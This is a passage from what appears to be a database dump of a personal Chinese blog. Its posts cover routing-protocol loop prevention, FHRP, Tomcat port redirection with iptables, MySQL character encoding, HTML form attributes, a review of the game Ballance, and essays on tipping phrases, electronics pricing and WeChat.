\r\n> 【3】     当某vlan生成树的根桥与该vlan热备份组的active/master不是同一台多层交换机时，可能会产生次优路径（同理于没有备份组只有唯一网关的子网）。\r\n> \r\n> 【4】      数据流量从互联网回来的时候，可能从active/master走也可能从备份网关走（假如它们都将子网宣告进路由协议）。\r\n\r\n    以上就是FHRP机制原理详解。若发现遗漏或错误之处，还请自行纠正。欲求更多信息请登录思科官网查询。（www.cisco.com）',1803),(29,'服务器端口/路径映射的实现','2018-01-25 15:08:42',1,0,9,'###目的:\r\n本来想方便用户,把tomcat的端口号从8080改成80,从而用户可以直接访问域名,但是中间出了一些小插曲:\r\n比如我在localhost(win10)下通过eclipse或者直接修改server.xml文件的端口号都是ok的,但是此方法用到centos服务器上就出现悲剧了:不仅不生效,把端口改回8080也无法启动服务,o(╯□╰)o,百思不得姐,只得重装了一遍tomcat,然后之间又经历了jdk环境崩溃,ftp速率降到冰点,电饭煲上的午饭烧焦等尴尬,最终终于装好了,,,\r\n百度不成,终于在谷歌上找到原因和解决方案:\r\n###原因:\r\n因为Linux限制了1-1024端口的使用权限，只有root用户才可以访问1024以下的端口号(咦?我就是root登录的啊???)\r\n###替代方案:\r\n>iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080\r\n\r\n利用防火墙的端口映射把8080端口引到80上(浏览器默认端口号),从而实现了端口号对用户透明的效果,虽然这个办法不完美,但也算长见识了,之于Apache的/var/www/html目录我至今不知道只能处理静态网页的web服务器有什么用,只能抛弃了.\r\n\r\n![这里写图片描述](https://image-store.slidesharecdn.com/099cd3a3-3795-46b9-91f1-0c431f3f8e30-original.jpeg)\r\n###关于路径映射\r\n开发者既要考虑到服务器的真实路径也要设计面向用户的虚拟路径,这两种路径的映射关系是在web.xml中设置的,除此之外,由于webapps目录有多个应用,但通常只用一个,所以还需要把服务器的根目录映射到这个应用的根目录:注意,对于浏览器来说,根目录是\"www.openidea.xin:8080/\",但是对于应用内部,根目录是\"www.openidea.xin:8080/Blog\"\r\n##总结\r\n端口映射和路径映射,当然还有虚拟主机映射(没谈到,下一次专门撰文介绍),这些映射关系的合理设计是网站引流的重要因素.',932),(30,'mysql新表latin编码的解决 @7.4','2018-01-25 19:17:19',0,0,7,'PuTTY连接服务器发现了一颗隐藏多年的问题:无法输入中文,凸(艹皿艹 )\r\n下面说一下在putty中建表格的时候不能输入中文报错的解决方法，一般会报下面的错误\r\n\r\n>ERROR 1366 (HY000): Incorrect string value: \'\\xD6\\xD0\\xCE\\xC4\' for column\r\n\r\n这时候我们只要修改我们想要插入中文字段的字符集编码就可以了\r\n\r\n>alter table table_name modify username char(20) character set utf8;\r\n\r\n编码问题是我永远的痛....\r\n如果单单是特殊字符无法跨编码格式存储也好办,问题是转义字符表达方式把这个问题残忍的解决了!!!\r\n导致我们根本不能从根源上发现问题蛤蛤蛤\r\n对了说一下putty设置编码的方式:\r\n![这里写图片描述](https://images0.cnblogs.com/blog/335252/201310/30100719-a398435d1e874b0e9477003c8486a135.jpg)\r\n世界统一于utf8将是多么美好啊',495),(32,'路由环路大总结！ [中]','2018-01-25 19:31:32',0,0,5,'三。RIP的5种防环机制：\r\n\r\n       Rip作为一个古老的路由协议，虽然正逐渐被淘汰，还是有必要了解一番以理解路由协议的进化史。\r\n\r\n       ！！视角：仅限于自身。rip没有邻居表，不知道邻居的信息，也没有下一跳。\r\n\r\nrip的局限性造致它有5种防环机制，且5种机制默认同时工作！！！\r\n\r\n       先谈一个易理解的的程序员逻辑，即路由器接从F0接口收到的某个路由条目A不应该从F0反发出去（水平分割），但是距离矢量路由协议的路由更新要向外发送完整的路由表，因此从F0发出之前将A路由的度量值改为15，这样对方收到的A的度量值为16不可达（计数最大跳&毒性逆转）。\r\n\r\n       当路由器R1检测到某网段的网络故障（比如收到icmp报错），它将要做两件事，第一，告诉其他路由器：\"你们无法从我这里到达这个子网\"，第二，寻找其他路径到达这个子网。此时R1将抑制定时器，即在规定时间内不接收邻居发来的关于该子网的路由。试想若没有抑制定时器，这时邻居正好发送该子网的路由，而这条路径恰好经过R1，那么后果将不堪设想。\r\n\r\n       在抑制时间内R1在做什么呢？当然是等待rip网络中所有路由器都收到这条16跳的路由后更正自己的路由表，因此需要触发更新，不必等时间到期再发路由表。此外当某接口的度量值被改动了也会触发更新，防环原理相同。\r\n\r\n       可以看出rip的5个防环机制中，设置最大跳才是终极武器，它配合抑制定时器，不仅能解决\"单链路环路\"，更能防止\"跨结点环路\"。\r\n\r\n \r\n\r\n四。EIGRP与DUAL算法:\r\n\r\n视角：周围可视/局部视角。\r\n\r\nEigrp的进步之处在于多了两张表：邻居表与拓扑表。\r\n\r\n       邻居表的建立直接避免了单链路环路：当在收到的路由更新中看到下一跳是自己，那没得说了，这条更新定是来源于我的，拒收。\r\n\r\n       Eigrp的核心算法叫DUAL（弥散更新），其中有一条公式专门用来防止跨结点环路：当邻居通向一个网络的报告距离(RD)比本地路由器通向同一个目的网络的可行距离（FD）短时，即符合了可行性条件(FC)，该路径被写进拓扑表。但这样的算法可想而知也是有缺陷的，即很多高开销的可行备份路径也会被当做\"环路\"而拒绝收录。\r\n\r\n！有一个特例：手动汇总导致的环路。\r\n\r\n       其实汇总本身是有\"缺陷\"的，当路由器把汇总的主类网路由更新传给对端时就相当于让对端生成了一些关于那些\"不存在\"的子类网路由指向自己。这样就不合理了，如果该路由器有一个默认路由指向对端的话，环路就形成了，一个以不存在的子网ip为目的地址的恶意数据包就会在两个路由器之间无限循环，直到跳数寿命终结。\r\n\r\n       解决方法（默认开启）是利用null0接口。本地生成的汇总路由指向这个逻辑空接口，这里要提一下路由查询的先后顺序：收到数据包先查看普通的单播路由条目，再查看本地汇总路由条目，最后才看默认路由。如图，这样就可以识别出那些数据包是恶意数据包，并且从null0口丢弃。\r\n\r\n![这里写图片描述](https://image-store.slidesharecdn.com/fa6ac6dd-886a-45f0-916a-acf21fc87d60-original.png)',1384),(33,'路由环路大总结！ [下]','2018-01-25 19:33:46',0,0,5,'五。Link state路由协议与SPF算法：\r\n\r\n！视角：全局（整个区域）视角/上帝视角。\r\n\r\n       除了拥有邻居表，Ospf有一张很强悍的表，叫LSDB（链路状态数据库）（同is-is）。在每个ospf区域中，通过互发lsa（跨网段传输的链路通告），每个路由器都能够获悉所在的整个区域的拓扑和链路状态。这样一来在区域内选路就可以从全局的视角锁定最佳路径，并且百分百无环路，无论是单链路环路还是跨结点环路都可避免，这是链路状态路由协议的创新之处。\r\n\r\n   OSPF区域间路由环路的避免又是通过哪种方式实现的？答案是：分层结构的拓扑实现。Ospf规定所有常规区域都要链接到骨干层，即使物理上与骨干层分隔，也要有条逻辑链路（虚链路）连接到骨干区域。这种树形结构从根本上就摒弃了环路。因此ospf也是天然无环的。\r\n\r\n   与ospf相似的IS-IS,则不要求L1层必须连接到L2层，因而有两个独特的防环机制：第一，非L2区域的通信都要通告L2区域转发；第二，L2区域路由默认不会进入L1（除了路由泄露）。因而实现了防环。附图：SPF树。\r\n\r\n![这里写图片描述](https://image-store.slidesharecdn.com/7499d7c5-05a3-44d4-aade-f4d8c09c392d-original.jpeg)\r\n\r\n六。BGP的高层防环机制：\r\n\r\n   谈到Bgp就要有关AS自治系统，bgp的防环主要分为AS内防环与AS间防环（可以类比ospf的区域内和区域间）。\r\n\r\n   AS间：路由更新的as-path字段包含所经过的所有AS号，当bgp路由器看到路由更新中有自己的AS号就会果断放弃这条更新（但在特殊情况下可以用命令取消这个特性）。这就是距离向量与距离矢量之间的区别：距离矢量路由协议（如rip）只记录到达目的地经过多少步，而距离向量路由器则记录了途中经过的路径。看来学好思科还得咬文嚼字啊。\r\n\r\n   Ibgp的水平分割原则是：从IBGP邻居所收到的路由信息，不会传递给其它的IBGP邻居，但可以传递给EBGP邻居。注意这和rip的水平分割不大一样。水平分割是为了防止3个及以上的ibgp peer围绕成环，造成自治系统内部的跨结点环路。\r\n\r\n   除了网络故障带来的路由环路，网络的不合理规划也会造成环路。比如在BGP中如果让ibgp间的中转路径路由器处于另一个AS内的话就会造成环路。当然这只是其中一个例子，意在说明人为的环路是很难避免的，但思科想的还真周到，提供了next-hop-unchange这条命令来处理上面那个环路。\r\n\r\n   注意，通常使用路由反射器（RR）来解决水平分割带来的路由不学习的问题，但搞笑之处在于，水平分割用来防环，路由反射器用来防水平分割，因而反射器又产生了环。后来RR经过改进，增加了一个特性叫插入簇ID与起源ID。默认情况下RR会在路由更新中加入自己的router-id以及路由更新的起源路由器的router-id，这也是一种路径向量的机制。\r\n\r\n附言：\r\n\r\n   有一句古话叫\"存在即合理\"。路由协议中有一些机制或者说小的细节特性，虽然看似很多余且无用，但却始终存在着。据我多年的学习经验，我想这有两种原因：一，从直觉上感觉它\"合情合理\"，比如bgp宣告路由发更新时打上自己的RID以标注起源信息；二，它的开销很小，比如RR发送更新包中携带一个短消息告诉邻居自己是RR，这与复杂的数据头部和各种周期消息比起来根本微不足道。',1470),(34,'致全球第一批全帧3D游戏 (1)','2018-01-26 13:32:30',0,0,4,'![00688cvOzy73Mf1yKa1c5.jpg](http://upload-images.jianshu.io/upload_images/8974305-f1a5d2cab2cfe08c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n致逝去的青春记忆。\r\n\r\n好久没人玩Ballance了吧，贴吧里貌似早已冷掉了。\r\n\r\n作为一款经典游戏，Ballance的宣传却做得不到位，官方的介绍甚至没能展现出它的全部诱人之处。所以笔者决定写一篇长文档来纪念这款经典，毕竟以后也没什么时间玩他了。​\r\n\r\n游戏的最大乐趣早已不再基于游戏出厂时​的内容了，它经过十年左右的改造，已经形成了如今丰富多彩的格局，有关“自制地图”，“自制元素”以及地图的捷径走法和修改器后面会详细提到。\r\n\r\n​跟着我的步伐，我将带你敲（撬）开Ballance世界的大门，能将一款游戏全部的优点全面而精简地写出来也是门艺术啊。。。\r\n![00688cvOzy73MhmxAoe26.jpg](http://upload-images.jianshu.io/upload_images/8974305-0e6867246bd26a34.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\nBallance是德国游戏制作公司CYPARADE的处女作，2004年一经问世便吸引了大量玩家的眼球，曾被授予过卓越徽章，并被评价为：采用极高明的方式将一个陈旧的观念进行了全新的转换，从而带给玩家新的游戏体验。\r\n\r\nBallance名字源于单词“balance”，所以中文名叫“平衡球”。​\r\n\r\nBallance是最早一批面世的单机3D游戏了，3D技术是这款游戏的核心：用3D模型搭建出有限空间里的各种物质。模型的根本技术就是一个三维坐标，所有物体都有自己的坐标，并以“近大远小”的原则打印在屏幕上。\r\n\r\n游戏的基本元素就是一些路面、建筑物、物品和一些背景物质（稍后将详细讲解）。\r\n\r\n综上所述，虽然游戏的成本并不高​，却能够以小小50M的硬盘空间展开成一幅宏伟壮观的3D世界，但取而代之的是运行需要占用有点高的cpu进程，毕竟是零四年的技术嘛。\r\n\r\n好，切入正题，即使你没听过这款游戏，看完这篇文章后保证你热血沸腾！\r\n\r\n​平衡球的主角自然是一个球（纸球，木球或石球）。\r\n![00688cvOzy73MiZRzBI16.jpg](http://upload-images.jianshu.io/upload_images/8974305-07e2dab8cc64af2e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n每种球都有不同但不变的参数：重力、惯性力、摩擦系数、弹性系数、最大水平速度。这是游戏开创性的特色，也是它独具魅力之处，那就是Ballance完全遵循着牛顿物理学定律。当年的宣传语是“挑战重力的极限！”，在不断运动和反复斟酌中获得游戏乐趣，积累了物理学方面的知识，在游戏中不失科学哲理。给人一种真实严谨的味道。​\r\n\r\n需要注意的一点是，驱使小球运动的力，可以视作球体内部的“原力”，或内力，且这种力是恒力，即大小一定，方向一定（但有四种方向）​。\r\n\r\n具体参数很复杂，笔者就不做列举了，但要知道这些参数是可以通过注册表修改的！哎，自从游戏的源代码被我们大中华子民破解后，Ballance就被我们疯狂的改造，甚至衍生出参数修改器这样的成品。你可以修改成弹力四射的橡皮球；也可以修改成随风飘荡，会飞的轻纸球；还可以改成晶莹剔透，声音清脆的玻璃球；更可以改成具有超强破坏力的高速球。​\r\n\r\n不同属性的球又进而衍生出了不同的游戏地图（环境），那就是著名的“国产自制地图”，也是国人最擅长的，文章最后将有图示哦(⊙o⊙)。\r\n![00688cvOzy73Ml8PjfEde.jpg](http://upload-images.jianshu.io/upload_images/8974305-b0f2a8aa0e63090f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n(*@ο@*)\r\n哇～这样一听是不是感觉很刺激​，当然远远不只有这些仿真特性，之后将让你大开眼界！\r\n\r\n游戏的视角是正对球与水平方向45°角，如图。按shift和空格键可以旋转和扩大视野。\r\n\r\n​行内人通常将平衡球与一个足球的大小相对应，那么电脑屏幕距离球大约有1.5米。(*^__^*)\r\n嘻嘻……!\r\n[00688cvOzy73MpnDREG46.jpg](http://upload-images.jianshu.io/upload_images/8974305-c02f6f658f650d40.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n当然这也是可以修改的。。。如果你懂算法，甚至可以生成一种霸气酷炫的“扭曲视角”。\r\n\r\n背景图不用多说，起到很重要的装饰作用，系统默认背景是大气层，地球以及外太空，正好配合了游戏的主题：整个游戏路面都悬浮在高空之中（或者通过一条看不到尽头的柱子支撑在地球上）。​你也可以从网上下载心仪的背景到游戏的根目录文件下，既可以是图片也可以是动画，依玩家喜好而定，同理背景音乐和物体振动特效音也是如此。\r\n![00688cvOzy73MlpHpr309.jpg](http://upload-images.jianshu.io/upload_images/8974305-cc2baad73c3c5bc6.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n',2481),(35,'Ballance纪念 (2)','2018-01-26 13:37:17',2,0,8,'——————游戏元素——————\r\n\r\n游戏元素是填充空间的基本物质，大致分为：背景元素、路面、建筑物、动态物品。\r\n\r\n背景元素是不影响通关本身的，总共有三种背景元素，除了之前提到的背景图和声音，还有云雾和阳光（甚至还有闪电漂浮物）这些动态仿真的大气物质。正是这些背景元素的存在让我们身临其境，体验到身处高空的惊悚与刺激，让我们回味无穷！！\r\n后三个是影响游戏进程的。整个游戏过程是方向键操控小球移动，克服沿途的障碍，想方设法达到终点，游戏没有时间限制（但影响分数），如果不幸从高空掉落将会扣除一个生命球。​\r\n\r\n唯爱Ballance！不同的物体或路面与球之间的撞击摩擦都会产生不同的声响，这无疑又增添了一番风味。其实说到这儿，Ballance已经完美了，但别急，还没说到自制图呢。\r\n![00688cvOzy73MoeRpWK56.jpg](http://upload-images.jianshu.io/upload_images/8974305-cc0a1b5df824d25f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n这张图覆盖了几乎所有的物体，当然还有“中国制造”的物体有待挖掘。\r\n\r\n每个基本元素都有特定的参数，就和球一样可以修改，但通常不建议大幅度地修改，因为大多人只能熟悉比较原始的手感，如果是要附加在新地图中分享给他人，最好还是“原汁原味”，不过想设计新元素的话就尽情发挥啦。\r\n\r\n​这些物体的基本功能因为太过丰富，笔者就不再赘述了，还是等玩家进入慢慢品味吧！\r\n![00688cvOzy73Mpmr8Db85.jpg](http://upload-images.jianshu.io/upload_images/8974305-45d07df339be5167.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n——————自制地图——————\r\n\r\n最让玩家们津津乐道的则是流落在全国各地网盘里的自制新地图，这是Ballance最最具有魅力的地方！从侧面体现了老百姓的聪明才智与创新精神，这也是我不断制作与收集的主要内容。\r\n\r\n如果说游戏出厂时提供的地图最高难度是★★★★（四星，行内标准），那我们网友制作的地图最难可达到★★★★★★★★★★（十星，个人判断）。\r\n\r\n选取了几张自制图分享给大家：​\r\n![00688cvOzy73MKcBeio04.png](http://upload-images.jianshu.io/upload_images/8974305-0e25c184953a4473.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n![00688cvOzy73MKfuG9197.jpg](http://upload-images.jianshu.io/upload_images/8974305-384a61eab430f569.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n![00688cvOzy73MtAM1km92.jpg](http://upload-images.jianshu.io/upload_images/8974305-be3bcf0bf1d2a929.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n![00688cvOzy73MtDk5jq78.jpg](http://upload-images.jianshu.io/upload_images/8974305-fb0e01a92a8ae3dd.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n![00688cvOzy73MtHOJvu54.jpg](http://upload-images.jianshu.io/upload_images/8974305-9f5094893191b826.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n![00688cvOzy73MtvEXsz67.jpg](http://upload-images.jianshu.io/upload_images/8974305-8b78e8f24c038ebd.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n目前网上已知的公开自制地图已经达到数百张，比如ballance地图管理站和ballance贴吧。这些网站里的内容无疑都是ballance爱好者智慧的结晶，你只需要将那些nmo文件下载到游戏根目录文件即可，具体做法还请参照《ballance修改手册》，上面还有介绍专业的地图制作工具virtools的使用方法。佩服华人的智慧！\r\n\r\n\r\n还没完呢，之前提到，自制环境与自制球会衍生出特殊地图。但由于花样众多，种类各异，每个人喜好不同，所有特殊地图很难做出归纳\r\n总结，更没能形成统一标准，所以经个人观察，目前市上比较火的相关的特别地图是这四大类​：分别是弹球图、专业竞速图、迷宫图和冒险图。相关内容我也不好\r\n一\r\n一概述，所以就送一句当年我最痴迷时期的感受吧：五彩缤纷，大开眼界，叹为观止，精彩不断！\r\n\r\n\r\n——————专业捷径——————\r\n\r\n全3D游戏的好处就在于，玩游戏不必拘泥于地图设计者希望你行走的路线，Ballance很灵活，既然完全遵循力学定律（除了空气阻力），设计者就必须按部就班，无法违背物理规律，因此不会出现什么“超自然”现象。\r\n\r\n自然，无论哪一种地图，或多或少都会存在一些巧妙的捷径可寻，玩家可尽情发挥想象，尽情探索尝试新的地图走法。这些捷径虽然违背了设计者原本的意图，但却给玩家带来很多乐趣​，不仅节约了些许时间，还给玩家带来更多的成就感~！！\r\n![00688cvOzy73MKsma4U28.gif](http://upload-images.jianshu.io/upload_images/8974305-02c49c89e189482e.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n但笔者试图挑战所有地图的捷径走法失败，真心佩服有些设计者的思维的严谨性，让我无空可钻。。\r\n\r\n更多精彩视频分享请进入ballance专区~\r\n\r\n由于是老游戏，部分电脑系统可能并不兼容，可以考虑用虚拟机~\r\n\r\n呼~写了近3个小时，中间还遭遇死机导致重写，不过还好没疯o(^▽^)o~​\r\n\r\n​真心希望Ballance能发扬光大！\r\n\r\n————by 平衡法师Jim\r\n![00688cvOzy75xiTtveD0f.jpg](http://upload-images.jianshu.io/upload_images/8974305-6e616ade182f05c1.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n',3083),(36,'博客搬家日志','2018-01-26 14:18:50',2,0,12,'准备做一个大动作,\r\n准备把散落在各地的原创博文全部搬到这里来,一下是来自我和我的团队在其他技术论坛的博客:\r\n###CSDN\r\n>http://blog.csdn.net/github_38885296\r\n\r\n###博客园\r\n>http://www.cnblogs.com/jinhengyu/\r\n\r\n###新浪博客\r\n>http://blog.sina.com.cn/jinhengyu12138\r\n\r\n###云栖社区\r\n>https://yq.aliyun.com/u/jinhengyu\r\n\r\n###OSChina\r\n>https://my.oschina.net/jinhengyu\r\n\r\n搬家需要客服很多难点:\r\n- 需要筛选原创内容(有接近一半是转载的(╯°Д°)╯︵┻━┻)\r\n- 要把html转成markdown(在线转换各种坑)\r\n- 所有的图片重新上传(不然有些网站不支持跨站访问图片.....)\r\n- 需要对搬家文章和原文章混合编排,修改日期\r\n\r\n但是图片肯定不能上传到自己的机器上去呀(^_−)☆,不然我40G的系统盘肯定要爆炸,所以只能默默地上传到例如网易LOFTER,QQ空间等平台,所以这也要克服url的可用性问题,比如有的图片url被隐藏了,或者img元素进行了src欺骗,比如百度图片,shit,最后经验之谈总结出了这些网站比较好:\r\n- LinkedIn领英,支持图片拖拽上传;\r\n- 简书,撰文支持版本控制,url同步获得;\r\n- 网易云相册,不过这个平台人气不如以往了;\r\n\r\nOK.期待ing',669),(37,'科普:求打赏的话怎么写?','2018-01-26 15:53:00',2,0,12,'>原文链接：https://www.jianshu.com/p/45da2f3d6247\r\n\r\n打赏功能好像成为了自媒体的一个标配，微博长文章、微信公众号、简书，短视频，直播，慕课都开通了打赏的功能,虽然web2.0时代已经被移动互联网时代超越,但是自媒体的脚步却越走越快,人人都渴望实现属于自己的个人品牌,实现人生价值,并从中获利，那求打赏的话要怎么写,其实和微博段子求点赞一个道理,无非就是卖萌,卖萌,还有卖萌.话不多上,直接上妮子:\r\n>以下所有打赏语抓取自签约作者的最新一篇文章。\r\n\r\n** 有金额数字版**\r\n\r\n打赏2块钱，帮我买杯咖啡，继续创作，谢谢大家！\r\n爱，就供养；喜欢/受益，就打赏！2元请我喝咖啡。\r\n如果本文对你有所帮助，请打赏——1元就足够感动我：）\r\n打赏不能超过你的早餐钱\r\n打赏不准超过你工资的一半\r\n如果有用，请我吃3块好吃的\r\n支持不要超过早餐费~\r\n大爷，赏个铜板呗\r\n已众筹到98元，只差您的2元就可继续买笔和创作啦~~~\r\n我知道我能威胁的都是爱我的人，所以，爱我就给我5.20。\r\n您打赏的一小步，维安钱包提现的一大步( •̀ ω •́ )y\r\n\r\n** 无金额数字版**\r\n嗯，我的梦想是被读者的稿费包养~\r\n此处应有打赏\r\n最近打算存点私房钱，吃点高端的SHA VILLA沙县小吃这样的餐厅\r\n拿钱去买猫粮，楼下的流浪猫在等我(\'\')ﾉ\r\n请赏我点铜板买喵粮自己吃，谢谢！\r\n喜欢就点赞or赞赏。\r\n喜欢你就打赏一下\r\n爷儿您要是看的乐，打个赏也让姑娘乐一乐\r\n请简单粗暴地爱我。\r\n\r\n**么么哒 卖萌版**\r\n点赞就好么么哒～～\r\n喜欢请点赞，么么哒。\r\n喜欢请点赞，么么哒。\r\n喜欢我的文章，成为我的天使投资人吧，么么哒\r\n最喜欢你一言不合就打赏的样子了~~~么么！\r\n么么哒，夏天来块儿冰西瓜！\r\n我不管，我要吃棒棒糖~\r\n感谢认可，么么哒。\r\n\r\n**不求打赏版**\r\n不需要打赏哦，喜欢我的文章就关注、点喜欢，欢迎分享到朋友圈，谢谢\r\n点喜欢就是最好的打赏！！\r\n打赏是支持，也可以移步公众号。\r\n分享是对我最大的赞赏 随缘随心\r\n你的点赞就是最大的帮助了。\r\n你若喜欢，不妨关注我的微信公众号“尹沽城”，真诚脸\r\n亲爱的读者朋友，如果觉得我写得不错，请点一个“喜欢”~\r\n求点赞求点关注心意到了就好谢谢你们~\r\n喜欢就关注我吧。(≧≦)/\r\n\r\n**硬广版**\r\n打赏不如买书，谢谢支持。 徐沪生：总有些路要独自行走。\r\n亲们，最好的打赏就是买一本格格的书！\r\n\r\n**格言金句版**\r\n你活着，并不需要证明什么。\r\n万物皆有时，比如你我相遇\r\n愿一切转为善。\r\n\r\n**神奇功效版**\r\n我们一起来让这个世界有趣一点……\r\n听说，打赏我的人最后都找到了真爱。\r\n听说打赏我的人，都进了福布斯排行榜\r\n打赏的都是天使。\r\n打赏了的人都会变美~\r\n\r\n除了求打赏的段子,还可以配图,最好用一些表情包什么的效果更棒\r\n你的文末打赏语是怎么写的？你看到的最有趣的打赏语是什么?敬请留言\r\n所以如果对这篇文章有启发,别忘了↓↓↓打赏我哦↓↓↓(￣▽￣)~*\r\n\r\n',1311),(38,'readonly表单元素的用途分析','2018-01-26 22:46:29',1,0,11,'###先引出出现的bug:\r\ninput的字段当为diabled时时无法获取数值得，所以最近不要用这个，我们可以用readonly带替代，即可解决这类问题。\r\n \r\n>1	<input name=\"country\" id=\"country\" size=12 value=\"disabled\"disabled=\"disabled\" \r\n \r\n放在form表单中提交后得不到该值。 \r\n将disabled=\"disabled\" 改为 readonly = \"readonly\" 即可 ,按照W3C的规范\r\n \r\n设置为disabled的input将会有下面的限制： \r\n1.不能接收焦点 \r\n2.使用tab键时将被跳过 \r\n3.可能不是successful的 \r\n \r\n设置为readonly的input将会有下面的限制： \r\n1.可以接收焦点但不能被修改 \r\n2.可以使用tab键进行导航 \r\n3.可能是successful的 \r\n只有successful的表单元素才是有效数据，也即是可以进行提交。disabled和readonly的文本输入框只能通过脚本进行修改value属性。 \r\n \r\n一、来看看这两个属性在效果和使用上的区别\r\n \r\n1 readonly是要锁定这个控件，通过在界面上无法修改他（但是通过javascript可以修改他）。\r\n \r\n2 disabled 和readonly有相同的地方也是可以锁定这个控件用户不能改变他的值，但是disabled的更彻底一些，他是要使你完全不能使用他，包括改变他的背景颜色（不信，你去修改一个被disabled掉的input文本框，你发现你是徒劳），如果是checkbox则不能选中他。\r\n \r\n3 所有控件都有disabled 属性，但是不一定有readonly属性，如select 下拉框。\r\n(1)text\r\n \r\n \r\n(2) checkBox\r\n \r\n \r\n(3)select下拉选择框（这里只能显示disabled和非disabled的区别，因为select 没有readonly属性\r\n \r\n \r\n(4)button按钮\r\n \r\n \r\n说明：点击被readonly掉的按钮照样可以触发事件，但是被disabled掉的按钮就无法使用了不管上面有没有事件。\r\n \r\n(5)div\r\n \r\n \r\n ###然后谈一谈思想\r\n以前不是很理解readonly表单元素存在的意义:既然它不能被用户修改,干嘛要多此一举呢?后来想到这是一种方便程序员逻辑的一种设计结构,即\"完整性\",程序员,尤其是前端程序员总是喜欢把东西分门别类,即使相差较大的东西,划分为同一类的代价就是体积的增大,或者说组成元素的扩充,html中有些元素或者属性,即使看不到,但它总是存在的.所以这种\"多余的\"元素从理论不是最优的,但却让整个系统更\"可读\",更易扩展,从而给用户带来更好的服务.\r\n \r\n说明：将div设置disabled属性之后，整个div都灰掉了，但是文本框里面还是可以输入内容的。\r\n注意：select下拉选择框是没有readonly属性的',1293),(39,'我是测试2','2018-01-26 23:40:18',0,0,3,'test',4),(40,'电子产品迭代降价的3个因素','2018-01-26 23:49:14',1,0,7,'以下是小编多年的观察和发现：\r\n\r\n  电子产品是以电能为工作基础，利用电缆、半导体、电阻电容、液晶、传感器和绝缘材料等电子元器件，以电磁极性和光波频率为信息源，综合构成的多功能产品。电子产品经历数十年的发展，覆盖范围从电话电视机、DVD投影仪、照相机收音机，再到如今的计算机网络设备、手机通讯产品、VR和物联设备。​\r\n\r\n\r\n 但是无论何种电子产品，都经历着一个相似的过程，那就是：从厂商一家独大到众厂研发；价格从昂贵到​低廉；性能从低到优。针对于这个现象，大多数人只知道“科技不断进步“这个大方向原因，却很少有人去探讨其中的深层原因，不然我们也不会拿电子产品去和食品衣服大家电相比较了。小编在此总结了三点符合电子产品特性的原因来解释上述现象。​\r\n\r\n首先，电子产品的成本很低！电子部件的原材料主要由一些轻金属和半导体制造而成。而这些物质在地球上简直唾手可得，这很好理解，电子产品的核心是技术本身而不是材料。这不同于大型的家用电器，比如洗衣机冰箱空调，需要安装大功率的发动机和高压冷凝器。因此低成本的电子产品使得生产商拥有源源不断可持续发展的能力。\r\n\r\n其次，产品的核心技术扩散极快！这里就要和其他的高科技产品做个比较了。比如核电站、化工医学、航空航天等高新产业，这些高科技产业的核心技术都是基于很前沿的科学技术，由一些顶尖的物理学家，生化学家来完成。某个国家一旦掌握了某个核心技术，将进行严格保密以防泄漏，其他发展中国家几十年甚至几百年都不可能知道。相比之下，计算机科学家就“low”了许多，电子计算机科学的研发主要还是基于算法的研究与设计，以及设备的性能测试，数学家是其主力军。而且电子产品是要面向大众的啊，当某个团队有了新的创意，开发出一个创新型产品（比如智能手机）收获大量用户，初期自然是他们一家独大，但很快这种技术就会被纷纷效仿，山寨，甚至被超越。最终商家竞价，产品自然跌价。\r\n\r\n最后，电子产品的更新周期非常短（如摩尔定律）！技术不断进步，通常，当一个创意被实现，公司首先就会将它公诸于世以实现利益最大化，而不是先考虑如何实现技术。产品面世后，公司才会疯狂的更新产品版本提高性能，因为知道其他公司必会跟风模仿。同一类产品最终的竞争还是比谁更新速度快。\r\n\r\n其实这些都符合时代发展的大趋势，只是目前电子产品的发展进程尚未达到稳定，市场尚未饱和，但依照上述3大特性，（理论上）在未来，电子电磁波技术甚至数学算法会达到一个可观的顶峰，也就是说人类将会实现全球免费上网和以电子设备为主的基础设施！！\r\n\r\n------by Jim',1073),(41,'微信之于QQ的市场哲学','2018-01-27 15:47:16',1,0,6,'2016年的移动app下载排行榜出炉后，我们惊奇发现，前十名中有6个应用软件来自腾讯公司。而前两名毋庸置疑是远远碾压第三名的微信与qq。这让我们看到社交app的重要性的同时也回到了那个原始的问题：腾讯公司在有了qq之后为什么还要开发微信？为什么微信能如此火热甚至超过了qq？\r\n\r\n\r\n\r\n\r\n早期也写过相关的论文，但这次我要从哲学和心理学的角度重新审视这个话题。\r\n\r\n10年代初，苹果产品掀起了智能手机的浪潮，人类由此从PC互联网时代走进移动互联网时代，人们的生活习惯发生了巨变。\r\n\r\n10年代以前，腾讯qq作为PC端通讯工具已经成为一种符号，影响着生活方方面面。\r\n\r\n10年代之后，微信成为移动终端社交工具的代表作品，病毒式的蔓延扩散。\r\n\r\n\r\n\r\n\r\n◆企业/团队都遵循着“产品多样性多元化”的原则。\r\n\r\n\r\n\r\n\r\n大型企业想要垄断整个行业领域，光靠最初的单一的产品是不行的，必须要开发其他产品，与原先的相辅相成，满足用户更多的需求。理由如下：\r\n\r\n1.单一产品无法承载过多功能，无法脱离“传统”\r\n\r\n2.多元化的产品大大扩宽了用户群体，如同“双重锁定目标”的哲学概念。\r\n\r\n\r\n\r\n\r\n无论是互联网公司，原厂，还是游戏和影视制作公司都默默遵循着这条法则以实现其可持续发展。\r\n\r\nQQ的基础上微信的诞生就是完美的遵循了“多样性”的原则。虽然qq手机端现在也做的不错，但他最初是完全建立在